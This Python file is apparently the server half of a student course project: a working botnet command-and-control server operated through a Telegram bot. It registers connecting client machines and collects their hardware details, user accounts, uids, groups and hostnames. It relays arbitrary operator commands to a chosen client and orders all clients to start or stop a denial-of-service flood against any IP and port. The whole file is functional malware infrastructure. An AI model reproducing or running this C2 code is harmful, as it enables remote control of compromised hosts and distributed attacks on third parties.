#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# ifrn/2023.2/programacao_para_redes/projeto/funcoes_servidor.py
# Copyright (C) 2023-2024  Sidney Pedro
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#

# Importando bibliotecas
from constantes import *
import requisicoes, funcoes, socket, threading, time

# Função para testar se um cliente, identificado pelo seu índice,
# está presente na lista de clientes e se o mesmo está livre para
# realizar uma transmissão
def cliente_existe_livre(index: int):
    try:
        cliente = clientes[index]
    except:
        return False
    while (cliente in clientes):
        try:
            trava = clientes[index][1].locked()
        except:
            return False
        if (not trava):
            break

    if (cliente in clientes):
        return True

    return False

# Função para receber dados de um cliente
def receber_dados(index):
    # Recebendo dados até que o buffer recebido seja menor que o
    # tamanho máximo de buffer
    retorno = ''
    try:
        dados = clientes[index][0][0].recv(TAMANHO_BUFFER).decode(CHARSET)
    except:
        return ''
    retorno += dados

    while (not len(dados) < TAMANHO_BUFFER):
        try:
            dados = clientes[index][0][0].recv(TAMANHO_BUFFER).decode(CHARSET)
        except:
            return ''
        retorno += dados

    return retorno

# Função para testar se um cliente, identificado pelo seu índice,
# está online
def cliente_online(index: int):
    global clientes

    # Testando se o cliente existe e está livre para transmissão e, se
    # não existir, retorna-se o índice
    if (not cliente_existe_livre(index)):
        return index

    # Travando transmissões para o cliente e tentando enviar mensagem
    # "ping" e, em caso de excessão, destrava-se as transmissões do
    # cliente, finaliza-se o socket do cliente, remove-se o mesmo da
    # lista de clientes e retorna-se o índice
    clientes[index][1].acquire()
    try:
        clientes[index][0][0].send("alive?".encode(CHARSET))
    except:
        print(f"Cliente {clientes[index][0][1]} desconectado!")
        clientes[index][0][0].close()
        clientes.pop(index)
        return index

    # Obtendo resposta do cliente e , se o tamanho da resposta do
    # cliente for menor que 1, finaliza-se o socket do cliente,
    # remove-se o mesmo da lista de clientes e retorna-se o índice
    resposta = receber_dados(index)
    if (len(resposta) < 1):
        print(f"Cliente {clientes[index][0][1]} desconectado!")
        clientes[index][0][0].close()
        clientes.pop(index)
        return index

    # Destravando as transmissões do cliente
    clientes[index][1].release()

    # Se a resposta do "ping" estiver incorreta, destrava-se as
    # transmissões para o cliente e retorna-se o índice
    if (resposta != "alive!"):
        return index

    # Atualizando momento da última verificação do cliente,
    # destravando as transmissões para o cliente e retornando o índice
    # mais um
    clientes[index][2]["ultima_verificacao"] = time.time()
    return index + 1

# Função para testar, periodicamente, se todos os clientes ainda
# estão conectados ao servidor
def testar_conexoes():
    while (continuar):
        time.sleep(TIMEOUT)

        if (len(clientes) < 1):
            continue

        index = 0
        while (index < len(clientes)):
            index = cliente_online(index)

    return

# Função para parar o servidor
def parar_servidor():
    global continuar
    continuar = False

    print(f"\nEncerrando servidor em {TIMEOUT} segundos...")
    return

# Função para iniciar servidor e gerenciar conexões
def gerenciar_servidor():
    global clientes

    # Criando socket TCP e desabilitando estado de TIME_WAIT do mesmo
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.settimeout(TIMEOUT)

    # Habilitando socket
    try:
        server_sock.bind(SOCKET_SERVIDOR)
        server_sock.listen()
    except:
        print(f"Erro: outra aplicação já está utilizando a porta {SOCKET_SERVIDOR[1]}!")
        parar_servidor()
        server_sock.close()
        return

    # Iniciando thread para teste periódico das conexões
    testes = threading.Thread(target=testar_conexoes)
    testes.start()

    # Recebendo conexões e as apresentando
    while (continuar):
        try:
            clientes.append([server_sock.accept(), threading.Lock()])
        except:
            continue

        # Obtendo e armazenando informações do cliente recém-conectado
        clientes[-1][1].acquire()
        informacoes = receber_dados(-1).split('\n')
        if (len(informacoes) < 2):
            clientes[-1][0][0].close()
            clientes.pop(-1)
            continue
        clientes[-1].append({
            "momento_conexao": time.time(),
            "ultima_verificacao": 0,
            "socket": f"{clientes[-1][0][1][0]}:{clientes[-1][0][1][1]}",
            "nome_cpu": informacoes[0],
            "nucleos_cpu": informacoes[1],
            "ram": informacoes[2],
            "disco": informacoes[3],
            "so": informacoes[4],
            "usuario": informacoes[5],
            "home": informacoes[6],
            "uid": informacoes[7],
            "grupo_principal": informacoes[8],
            "grupos": informacoes[9],
            "shell": informacoes[10],
            "nome_host": informacoes[11]
        })
        clientes[-1][1].release()

        print(f"Cliente {clientes[-1][0][1]} conectado!")

    server_sock.close()
    return

# Função para testar se uma verificação de conectividade irá
# ocorrer e, se sim, aguardar sua finalização
def aguardar_verificacao(index: int):
    try:
        cliente = clientes[index]
    except:
        return
    while (cliente in clientes):
        try:
            tempo = clientes[index][2]["ultima_verificacao"]
        except:
            return
        if (time.time() - tempo < TIMEOUT - 1):
            break

        time.sleep(1)

    return

# Função para anunciar negação de serviço a todos os clientes
def anunciar_negacao(tokens: list):
    global clientes

    if (tokens[2] != "iniciar" and tokens[2] != "parar"):
        return ''

    try:
        sock = tokens[3].split(':')
    except:
        return "Socket inválido!"

    ip = sock[0]
    if (not '.' in ip and not ':' in ip):
        return "O IP informdo não é um IP!"
    elif (ip in ("0.0.0.0", "127.0.0.1", "::1", SOCKET_SERVIDOR[0], "localhost")):
        return "Você não deveria tentar estressar o servidor!"

    try:
        ip = socket.gethostbyname(ip)
    except:
        return "IP inválido!"

    if (not funcoes.ehinteiro(sock[1])):
        return "A porta informada não é um número!"

    porta = int(sock[1])

    if (porta < 0 or porta > 65535):
        return "Porta inválida!"

    # Enviando pedido de negação de serviço para todos os clientes
    index = 0
    while (index < len(clientes)):
        aguardar_verificacao(index)
        clientes[index][1].acquire()
        try:
            clientes[index][0][0].send(f"{tokens[0]} {tokens[1]} {tokens[2]} {tokens[3]}".encode(CHARSET))
            clientes[index][1].release()
        except:
            clientes[index][0][0].close()
            clientes.pop(index)
            continue
        index += 1

    return f"Negação de Serviço para {tokens[3]}: {tokens[2]}"

# Função para responder mensagem informando desconexão de cliente
# e finalizar o socket do mesmo
def informar_desconexao(index: int, retorno: dict):
    global clientes

    retorno["text"] = f"Cliente {clientes[index][0][1]} desconectado!"
    requisicoes.responder_mensagem(retorno)
    print(f"Cliente {clientes[index][0][1]} desconectado!")
    clientes[index][0][0].close()
    clientes.pop(index)

    return

# Função principal do servidor
def servidor():
    # Armazenando, globalmente, variável de continuidade da execução
    # do servidor e lista de clientes
    global continuar, clientes
    continuar = True
    clientes = []

    # Iniciando thread para inicio e gerenciamento do servidor
    servidor = threading.Thread(target=gerenciar_servidor)
    servidor.start()

    # Se o programa poder continuar, apresenta-se informações do bot
    if (continuar):
        print("Para acessar o bot, acesse @progredes_c2_bot no Telegram ou clique no link direto: https://t.me/progredes_c2_bot")
        print("Para encerrar o servidor, pressione Ctrl-c\n")

    # Loop de funcionamento do bot
    latest_update_id = 0
    while (continuar):
        # Obtendo última atualização e mensagem e, em caso de exceção,
        # tenta-se novamente
        try:
            latest_update_id, latest_message = requisicoes.obter_atualizacoes(latest_update_id)
        except KeyboardInterrupt:
            parar_servidor()
            continue
        except:
            continue

        # Se não houver novas mensagens, volta-se ao início
        if (latest_message == None):
            continue

        # Salvando última atualização
        requisicoes.salvar_update_id(latest_update_id)

        # Lendo ID do chat e da mensagem e montando dicionário de retorno
        chat_id = latest_message["message"]["chat"]["id"]
        message_id = latest_message["message"]["message_id"]
        retorno = {
            "chat_id": chat_id,
            "reply_to_message_id": message_id,
            "parse_mode": "Markdown",
            "text": ''
        }

        # Se não há texto na mensagem recebida, responde-se à mensagem
        if (not "text" in latest_message["message"]):
            requisicoes.responder_mensagem(retorno)
            continue

        # Analisando se mensagem recebida é válida e respondendo com ação
        # correspondente
        message_text = latest_message["message"]["text"]
        tokens = message_text.split()
        if (len(tokens) == 1 and (tokens[0] == "./c2" or tokens[0] == "/start")):
            retorno["text"] = "./c2 -h"
            requisicoes.responder_mensagem(retorno)
            continue
        elif (tokens[0] != "./c2"):
            requisicoes.responder_mensagem(retorno)
            continue
        elif (tokens[1] == "-h"):
            retorno["text"] = "./c2 -h"
            requisicoes.responder_mensagem(retorno)
            continue

        # Analisando conteúdo da mensagem recebida e respondendo com sua
        # ação correspondente
        if (len(clientes) < 1 and message_text != "./c2 -q 0"):
            retorno["text"] = f"Não há clientes conectados!"
            requisicoes.responder_mensagem(retorno)
            continue
        elif (tokens[1] == "-l"):
            retorno["text"] = funcoes.obter_clientes(clientes)
            requisicoes.responder_mensagem(retorno)
            continue
        elif (tokens[1] == "-n" and len(tokens) == 4):
            retorno["text"] = anunciar_negacao(tokens)
            requisicoes.responder_mensagem(retorno)
            continue

        # Analisando se mensagem possui mais ou menos de três argumentos
        # e, se tiver três, se o terceiro é um número inteiro
        if (len(tokens) < 3 or len(tokens) > 3):
            requisicoes.responder_mensagem(retorno)
            continue
        elif (not funcoes.ehinteiro(tokens[2])):
            requisicoes.responder_mensagem(retorno)
            continue

        # Obtendo índice do cliente e, se o comando for o de "parar" e o
        # índice for -1, para-se o servidor. Se não, se o índice for
        # inválido, responde-se com aviso
        index = int(tokens[2]) - 1
        if (tokens[1] == "-q" and index == -1):
            retorno["text"] = f"Encerrando servidor em {TIMEOUT} segundos..."
            requisicoes.responder_mensagem(retorno)
            parar_servidor()
            continue
        elif (index < 0 or index >= len(clientes)):
            retorno["text"] = f"""ID inválido!

Digite `./c2 -l` para obter a lista de IDs disponíveis"""
            requisicoes.responder_mensagem(retorno)
            continue
        elif (tokens[1] == "-d"):
            retorno["text"] = funcoes.obter_hardware(clientes, index)
            requisicoes.responder_mensagem(retorno)
            continue
        elif (tokens[1] == "-u"):
            retorno["text"] = funcoes.obter_usuario(clientes, index)
            requisicoes.responder_mensagem(retorno)
            continue

        # Testando se o cliente está disponível para receber mensagem e,
        # se o mesmo deixar de existir, informa-se desconexão do mesmo
        aguardar_verificacao(index)
        if (not cliente_existe_livre(index)):
            informar_desconexao(index, retorno)
            continue

        # Travando transmissões para o cliente e tentando enviar mensagem
        # obtida ao cliente e, em caso de exceção, destrava-se as
        # transmissões do cliente e informa-se desconexão do mesmo
        clientes[index][1].acquire()
        try:
            clientes[index][0][0].send(message_text.encode(CHARSET))
        except:
            informar_desconexao(index, retorno)
            continue

        # Obtendo resposta do cliente e, se o tamanho da resposta for
        # menor que 1, informa-se desconexão do cliente
        retorno["text"] = receber_dados(index)
        if (len(retorno["text"]) < 1):
            informar_desconexao(index, retorno)
            continue

        # Destravando as transmissões do cliente e respondendo mensagem
        # com resposta do cliente
        clientes[index][1].release()
        responder = threading.Thread(target=requisicoes.responder_mensagem, args=(retorno,))
        responder.start()

    return
